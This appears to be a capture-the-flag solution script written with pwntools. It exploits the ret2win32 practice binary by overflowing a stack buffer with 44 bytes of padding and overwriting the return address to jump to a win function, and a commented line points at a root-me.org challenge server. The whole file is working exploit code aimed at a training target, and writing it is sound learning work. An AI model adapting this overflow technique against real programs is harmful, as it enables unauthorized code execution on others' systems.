from pwn import *
import struct
import sys
import time

challenge = './ret2win32'
# conn = remote('challenge03.root-me.org', 2223)
context.update(arch='i386', os='linux')
elf = ELF(challenge)
rop = ROP(elf)

payload = cyclic(44) + p32(0x0804862c)
io = process(challenge)
print(io.recvuntil(b'> '))
io.sendline(payload)
io.interactive()
print('end')
# print(bin_sh_addr)